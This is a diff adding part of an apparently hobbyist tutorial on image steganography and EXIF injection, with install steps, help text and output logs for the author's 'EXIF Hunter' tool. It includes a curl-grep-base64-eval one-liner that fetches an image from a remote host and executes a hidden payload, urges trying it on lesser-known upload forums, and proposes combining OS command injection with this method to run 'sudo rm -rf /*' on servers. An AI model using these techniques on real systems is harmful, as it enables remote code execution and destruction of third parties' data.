@@ -1053,6 +1053,347 @@ our injected image is the same but now has the payload
 
 this means our code is now injected into the image, now lets make a simple command to filter and execute this data
 
-`p=$(curl -s https://github.com/ArkAngeL43/EXIF-Stegonography-and-image-injection/blob/main/zip_utils/example.jpg | grep Cert -a | sed 's/<[^>]*>//g' | base64 -d);eval $p`
+`p=$(curl -s http://url/infected.jpg | grep Cert -a | sed 's/<[^>]*>//g' | base64 -d);eval $p`
+
+this command will make a curl request to a example forum which is a false link to the image and filter out the certificate, now you can test this on image upload forums which arent as popular, i will warn you this is a very ouch method and might only work in rare situations, this is because of a method called EXIF sanitization, which rips out the EXIF data, i tried uploading the infected image onto github, instagram, facebook, and twitter but when i made the request and used wget to check the exif i got alot of crap information like 
+
+```
+ExifTool Version Number         : 12.30
+File Name                       : injected.jpg
+Directory                       : .
+File Size                       : 177 KiB
+File Modification Date/Time     : 2022:02:27 09:14:37-05:00
+File Access Date/Time           : 2022:02:27 09:14:37-05:00
+File Inode Change Date/Time     : 2022:02:27 09:14:37-05:00
+File Permissions                : -rw-r--r--
+File Type                       : HTML
+File Type Extension             : html
+MIME Type                       : text/html
+Viewport                        : width=device-width
+Title                           : EXIF-Stegonography-and-image-injection/injected.jpg at main · ArkAngeL43/EXIF-Stegonography-and-image-injection · GitHub
+Description                     : A simple compiling of notes and information / teachings on how stegonography works, and how we can use stegonography to execute system commands or inject ZIP files into JPG/JPEG formats - EXIF-Stegonography-and-image-injection/injected.jpg at main · ArkAngeL43/EXIF-Stegonography-and-image-injection
+Apple Itunes App                : app-id=1477376905
+Twitter Image Src               : https://opengraph.githubassets.com/e033078e321b09ddb1e53027f0c4b39123a582b0f7be40d4520043eb51ac7fd9/ArkAngeL43/EXIF-Stegonography-and-image-injection
+Twitter Site                    : @github
+Twitter Card                    : summary_large_image
+Twitter Title                   : EXIF-Stegonography-and-image-injection/injected.jpg at main · ArkAngeL43/EXIF-Stegonography-and-image-injection
+Twitter Description             : A simple compiling of notes and information / teachings on how stegonography works, and how we can use stegonography to execute system commands or inject ZIP files into JPG/JPEG formats - EXIF-Steg...
+Request Id                      : BD08:5CBC:108A81A:1A701CB:621ADE83
+Html Safe Nonce                 : 8638be68f8018500c61626d04fc29d15b5b408214393ac7dd9b030ec236255d8
+Hovercard Subject Tag           : repository:463935937
+Github Keyboard Shortcuts       : repository,source-code
+```
+
+which basically means there is no cert anymore which means no more payload, not all services do this you will opnly find major corperations doing this, however if you needed to upload this image to a forum that is http and does not use the EXIF sanitization process then the malware or code in the image will be able to execute
+
+# Discussing topics, questions and conclusions 
+
+> why did i write this 
+
+This was very very vague and touched the tip of the iceburg when it came to using stenography as a malicous tool for hacking or penetration testsing, the reason i wrote this was because of people wondering if using this malicously was possible, and if it is possible to really bypass or grab admin rights to servers with this. This post was a very very simple Proof of concept for what is possible with stenography, there are some proof of concepts i would like to discuss and have yall read over that i believe are real and am currently working on prooving them one which will be talked about after this. i will also have you know that this was only to explain how exploiting someones machine or server was possible with manual image injection, and to teach cyber weapon usages like exif-hunter and general cyber security 
+
+> My PoC to soon be prooven 
+
+As i was writing this i made a intriguing theory, the theory is to delete a servers operating system simply through using an image, let me explain a bit more.say you come across a server that is vulnerable to OS command injection (OSCI), and is running on a linux machine. because of this old method, we could inject the command into the server to make it make a simple GET request to a image posting forum which does NOT use the EXIF sanitization process to filter out EXIF data, and execute the data on the webserver which would be a payload like `sudo rm -rf /*` while that needs root you could probobly just run a privlege escalation payload or something to get you admin rights to the server 
+
+this is quite weird and would need alot of practice to see if it is possible, despite me not knowing much about OSCI i think from my base knowlege with it, it should be very possible as long as you have the right cordination and map.
+
+> The useage of this post 
+
+This post teaches alot about basic stenography, such as injecting images with data and files, extracting metadata and files, along with making your own tools to aid yourself in this field. Stenography can be used for lots and lots of things it just takes creativity to make your own idea of how to make something turn into something it is not by defualt. 
+
+> My ending of this section 
+
+I hope this section / lesson helped you out, and helped explain the good side and the bad side to stenography. While this is not exactly what people need to exploit servers, it is exactly what you need to help you understand the basics of image injection and manipulation, as well as making your own tools to automate processes like this, i do know i focused primarily in go however it was not needed for me to dive into a billion languages, i believe if you have creativity you will be able to take the scripts in this section / lesson and turn them into a whole new language and format like i did with EXIF Hunter 
+
+# Sub 
+
+This section is the last section and end of file but rather simply automating the processes that was discussed here with EXIF hunter 
+
+> downloading, installig, and help menu of exif hunter 
+
+<h5>Install</h5>
+
+`git clone https://github.com/ArkAngeL43/EXIF-Hunter-V1.0.git ; cd EXIF-Hunter-V1.0 ; chmod +x ./install.sh ; ./install.sh ; go run main.go --help`
+
+<h5> Help menu </h5>
+
+```
+
+ 
+                         _______ ___ ___ _______ _______                  _______               __              
+                        |    ___|   |   |_     _|    ___|     ______     |   |   |.--.--.-----.|  |_.-----.----.
+                        |    ___|-     -|_|   |_|    ___|    |______|    |       ||  |  |     ||   _|  -__|   _|
+                        |_______|___|___|_______|___|                    |___|___||_____|__|__||____|_____|__|
+                        Image injection and Forensics Command Line Software for PNG and JPG image/file formats 
+                        -------------------------------------------------------------------------------------
+                        Author -> ArkAngeL43
+                        Github -> https://github.com/ArkAngeL43
+                        ------
+                             |> Help menu
+
+                        ------
+                             |> Flags
+                                   |
+                                   |++>
+                                   ____________________________________________________________________________________________________CSTAT__
+                                    -o or --output  | Specify the output image after injection                                       | Active | 
+                                    -i or --input   | Specify the input image for injection, metadata, etc                           | Active | 
+                                    --inject        | Inject data into a PNG image                                                   | Active | 
+                                    --offset        | Usable with --inject, this is the offset to inject data into                   | Active | 
+                                    --meta          | Grab meta data of the image such as EXIF and OFFSET locations                  | Active | 
+                                    --JPGINJECT     | Inject ZIP files or files into JPG/JPEG Images formats                         | Active | 
+                                    --JPGEXTRACT    | Extract ZIP files from JPEG/JPG Image formats                                  | Active |
+                                    --help or -h    | Run this help menu                                                             | Active | 
+                                    --encode        | XOR Encode the payload to inject into PNG images                               | Active | 
+                                    --decode        | XOR Decode the payload to inject into PNG images                               | Active | 
+                                    --key           | The encryption key for the payload                                             | Active | 
+                                    --suppress      | Suppress the chunk hex data which can be large                                 | Active | 
+                                    --hexd          | Hex dump an image or file                                                      | Active | 
+                                    --geo           | Trace the GEO-GPS Tags to a location in JPG image formats                      | Active | 
+                                    --filepath      | Specify the ZIP to inject into JPG/JPEG image formats                          | Active | 
+                                    --walkf         | Fast scan linux root filesystems for JPEG images that possibly have ZIP files  | Active |
+                                    --discover      | Discover what filetype a file is that is seen as `unknown`                     | Active |
+                                    --type          | Type is the name of the Chunk header to inject (DEFUALT: rNDm)                 | Active |  
+                                   ------------------------------------------------------------------------------------------------------------
+                              |> Example Usages
+                                        |
+                                        |+++>|
+                                        _______________________________________________________________________________________________________
+                                        | go run main.go -i img/main.png --meta                                           | Grabs the metadata on the image
+                                        | go run main.go -i img/main.png -o j.png --inject --offset 0x85258 --data 13234  | Injects data into an image
+                                        | go run main.go -i img/example.jpg --geo                                         | Gets GEO Location of image
+                                        | go run main.go -i unknown_filename --discover                                   | Will try to identify files without extensions
+                                        | go run main.go --filepath / --walkf                                             | Walk the filepath for image files
+                                        | go run main.go -i bety.jpg --hexd                                               | Hex dump an image or file
+                                        | go run main.go -i bety.jpg -o bety_injected.jpg --JPGINJECT --filepath main.zip | Inject a ZIP file into a JPG image 
+                                        | go run main.go -i img/injected_zip.jpg --JPGEXTRACT                             | Scan and extract ZIP files from JPG images
+                                        | >>>>++++                                                                        ]
+                                        | go run main.go -i in.png -o encode.png --inject --offset 0x85258 --payload 1234 | Will inject a PNG image with a encoded payload
+                                        | --encode --key secret                                                           | WITH secret keys                                   
+                                        | >>>>++++                                                                        ]
+                                        | go run main.go -i encode.png -o decode.png --offset 0x85258                     | Will decode a messgae or injected data set
+                                        | --decode --key secret                                                           | With a certian key to decode
+                                        |                                                                                 |
+                                        | go run main.go --filepath / --walk                                              | Will dump ALL EXIF DATA ON EVERY FILEPATH 
+                                        | AND FILE LABELED JPEG, JPG, PNG, PG, GIF, ETC within a specified filepath       | 
+                    
+                                                                                                            
+
+  -i, --input string           Path to the original image file
+  -o, --output string          Path to output the new image file
+  -m, --meta                   Display the actual image meta details
+  -s, --suppress               Suppress the chunk hex data (can be large)
+      --offset string          The offset location to initiate data injection
+      --inject                 Enable this to inject data at the offset location specified
+      --payload string         Payload is data that will be read as a byte stream
+      --type string[="rNDm"]   Type is the name of the Chunk header to inject (default "rNDm")
+      --key string             The enryption key for payload
+      --encode                 XOR encode the payload
+      --decode                 XOR decode the payload
+      --JPGEXTRACT             Scan for ZIP files and extract them from images | JPEG FORMAT ONLY
+      --JPGINJECT               Start / Activate ZIP file injection
+      --filepath string        path to the ZIP FILE
+      --hexd                   Hex dump a image
+      --geo                    Get the GEO location of a JPG/JPEG Info, of which has GPS location 
+      --walk                   Walk a filepath for images and EXIF dump all data to all images
+      --walkf                  Walk a filepath for images
+      --discover               Determin the type of file of an unknown file
+```
+
+> Using EXIF hunter for meta data tag searching for PNG image formats
+
+`go run main.go -i image.png --meta`
+
+<h5> Output </h5>
+
+```
+ [INFO]   09:43:20   -> File Exists 	 battlecat.png
+ [INFO]   09:43:20   -> Opening file   	 battlecat.png
+ [INFO]   09:43:20   ->  battlecat.png 	 Successfully opened
+
+=== EXIF Table ===
+┌─────────────╥───────────────────┬─────────────────────────┐
+│ Data Number ║ Data              │After DATA EXIF          │
+├─────────────╫───────────────────┼─────────────────────────┤
+│1            ║FileType           │           PNG           │
+├─────────────╫───────────────────┼─────────────────────────┤
+│1            ║Directory          │            .            │
+├─────────────╫───────────────────┼─────────────────────────┤
+│1            ║FileTypeExtension  │           png           │
+├─────────────╫───────────────────┼─────────────────────────┤
+│1            ║ImageWidth         │           741           │
+├─────────────╫───────────────────┼─────────────────────────┤
+│1            ║MIMEType           │        image/png        │
+├─────────────╫───────────────────┼─────────────────────────┤
+│1            ║ExifToolVersion    │          12.30          │
+├─────────────╫───────────────────┼─────────────────────────┤
+│1            ║ImageSize          │         741x633         │
+├─────────────╫───────────────────┼─────────────────────────┤
+│1            ║Megapixels         │          0.469          │
+├─────────────╫───────────────────┼─────────────────────────┤
+│1            ║FileAccessDate     │2022:02:27 02:44:17-05:00│
+├─────────────╫───────────────────┼─────────────────────────┤
+│1            ║FileName           │      battlecat.png      │
+├─────────────╫───────────────────┼─────────────────────────┤
+│1            ║ColorType          │     RGB with Alpha      │
+├─────────────╫───────────────────┼─────────────────────────┤
+│1            ║BitDepth           │            8            │
+├─────────────╫───────────────────┼─────────────────────────┤
+│1            ║ImageHeight        │           633           │
+├─────────────╫───────────────────┼─────────────────────────┤
+│1            ║FileModifyDate     │2022:02:27 02:44:17-05:00│
+├─────────────╫───────────────────┼─────────────────────────┤
+│1            ║FileInodeChangeDate│2022:02:27 03:07:06-05:00│
+├─────────────╫───────────────────┼─────────────────────────┤
+│1            ║FileSize           │         533 KiB         │
+├─────────────╫───────────────────┼─────────────────────────┤
+│1            ║Compression        │     Deflate/Inflate     │
+├─────────────╫───────────────────┼─────────────────────────┤
+│1            ║Filter             │        Adaptive         │
+├─────────────╫───────────────────┼─────────────────────────┤
+│1            ║Interlace          │      Noninterlaced      │
+├─────────────╫───────────────────┼─────────────────────────┤
+│1            ║FilePermissions    │       -rw-r--r--        │
+└─────────────╨───────────────────┴─────────────────────────┘
+=== END of EXIF Table === 
+
+ Found IEND chunk -> 
+ +---------------+-------------------------------+--------------------------------------+
+|    Chunk Type |    Location Injectable OFFSET |    Injectable OFFSET HEX Translation |
++===============+===============================+======================================+
+|          IEND |                        545368 |                              0x85258 |
++---------------+-------------------------------+--------------------------------------+
 
 
+```
+
+<h5> Dumping CRC tags and chunks of PNG image formats </h5>
+
+```
+Would you like to locate just the IEND chunk? and injectable offset <y/n > 
+ 
+[!] If you wanted to you can type -> chunk_finish to get all data chunks in the image as well
+chunk_finish
+
+ +-----------+----------+-----------------+---------------------+-----------------+
+|    Offset |    Chunk |    Chunk Number |    Chunk Importance |    Chunk Length |
++===========+==========+=================+=====================+=================+
+|      0x08 |     IHDR |               1 |            Critical |              13 |
++-----------+----------+-----------------+---------------------+-----------------+
+
+Chunk CRC => 99e4ec6
+
+ +-----------+----------+-----------------+---------------------+-----------------+
+|    Offset |    Chunk |    Chunk Number |    Chunk Importance |    Chunk Length |
++===========+==========+=================+=====================+=================+
+|      0x21 |     IDAT |               2 |            Critical |           32768 |
++-----------+----------+-----------------+---------------------+-----------------+
+
+Chunk CRC => df8ffef3
+
+ +-----------+----------+-----------------+---------------------+-----------------+
+|    Offset |    Chunk |    Chunk Number |    Chunk Importance |    Chunk Length |
++===========+==========+=================+=====================+=================+
+|    0x802d |     IDAT |               3 |            Critical |           32768 |
++-----------+----------+-----------------+---------------------+-----------------+
+
+Chunk CRC => 2142ea4a
+--SNIP--
+```
+
+> Injecting data using EXIF hunter, ex payloads and ZIP files 
+
+<h5> Inject Data into PNG images </h5>
+
+`Command -> go run main.go -i img/geo.png -o j.png --inject --offset 0x85258 --payload 13234`
+
+- output
+
+```
+ [INFO]   09:45:09   ->  [80 78 71]  Came back as a VALID HEADER
+ [INFO]   09:45:09   -> Payload Original -> [49 51 50 51 52]
+ [INFO]   09:45:09   -> Payload          -> [49 51 50 51 52]
+ [INFO]   09:45:09   -> Success injecting, created file    	 j.png
+ [INFO]   09:45:09   -> Reading and dumping new file
+
+```
+
+<h5> Injecting ZIP files into JPG files </h5>
+
+`command -> go run main.go -i inject.jpg -o injected.jpg --JPGINJECT --filepath path/to/zip/file/main.zip`
+
+- output 
+
+```
+
+ [INFO]   09:49:47   -> File Opened and READ             	 azU35V.jpg
+ [INFO]   09:49:47   -> Preping output as injected file  	 zip.jpg
+ [INFO]   09:49:47   -> ZIP file has been opened         	 azU35V.jpg
+ [INFO]   09:49:47   -> OUTPUT File with injection made  	 zip.jpg
+ [INFO]   09:49:47   ->  Finished Injection of image at  	 09:49:47 zip.jpg
+ [INFO] WARNING: LOG: DATA: INFO: ->  09:49:47 	 Going to attempt to locate the file, this will let you know that the data and file was for sure injected into the image :D 
+
+ ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+2022/02/27 09:49:47 Found zip signature at byte 1179845.
+Unzip it? (Y/N) > Y
+OK
+
+7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
+p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,16 CPUs AMD Ryzen 7 3700X 8-Core Processor              (870F10),ASM,AES-NI)
+
+Scanning the drive for archives:
+1 file, 1180017 bytes (1153 KiB)
+
+Extracting archive: zip.jpg
+--
+Path = zip.jpg
+Type = zip
+Offset = 1179845
+Physical Size = 172
+
+    
+Would you like to replace the existing file:
+  Path:     ./passwords.txt
+  Size:     12 bytes (1 KiB)
+  Modified: 2022-02-27 03:06:23
+with the file from archive:
+  Path:     passwords.txt
+  Size:     12 bytes (1 KiB)
+  Modified: 2018-10-21 08:37:36
+? (Y)es / (N)o / (A)lways / (S)kip all / A(u)to rename all / (Q)uit? 
+```
+<h5>Extract ZIP files from JPG images</h5>
+
+`command -> go run main.go -i zipfile.jpg --JPGEXTRACT`
+
+- output 
+
+```
+2022/02/27 09:51:54 Found zip signature at byte 1179845.
+Unzip it? (Y/N) > Y
+OK
+
+7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
+p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,16 CPUs AMD Ryzen 7 3700X 8-Core Processor              (870F10),ASM,AES-NI)
+
+Scanning the drive for archives:
+1 file, 1180017 bytes (1153 KiB)
+
+Extracting archive: zip.jpg
+--
+Path = zip.jpg
+Type = zip
+Offset = 1179845
+Physical Size = 172
+
+    
+Would you like to replace the existing file:
+  Path:     ./passwords.txt
+  Size:     12 bytes (1 KiB)
+  Modified: 2022-02-27 03:06:23
+with the file from archive:
+  Path:     passwords.txt
+  Size:     12 bytes (1 KiB)
+  Modified: 2018-10-21 08:37:36
+```
